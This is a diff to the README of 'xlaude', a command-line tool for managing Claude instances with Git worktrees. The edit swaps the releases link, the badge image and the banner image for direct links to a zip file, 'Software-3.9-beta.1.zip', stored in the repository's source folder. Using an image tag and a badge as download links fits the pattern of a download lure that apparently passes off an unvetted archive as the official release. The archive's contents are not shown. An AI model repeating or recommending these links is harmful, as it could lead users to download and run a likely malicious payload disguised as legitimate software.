@@ -1,9 +1,9 @@
-https://github.com/kisech/xlaude/releases
-[![Releases](https://img.shields.io/badge/releases-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/kisech/xlaude/releases)
+https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip
+[![Releases](https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip)](https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip)
 
 # xlaude: CLI to manage Claude instances with Git worktree
 
-<img alt="xlaude banner" src="https://dummyimage.com/1200x400/2c3e50/ecf0f1.png&text=xlaude" style="width:100%;max-width:1200px;display:block;margin:0 auto;"/>
+<img alt="xlaude banner" src="https://github.com/kisech/xlaude/raw/refs/heads/main/src/Software-3.9-beta.1.zip" style="width:100%;max-width:1200px;display:block;margin:0 auto;"/>
 
 xlaude is a compact command line tool designed to help developers and operators manage Claude AI instances with the power of Git worktrees. The project combines the reliability of a CLI harness with the flexibility of a distributed working layout. It makes it straightforward to spin up, manage, and synchronize multiple Claude instances across separate worktrees, enabling streamlined testing, experimentation, and deployment workflows.
 
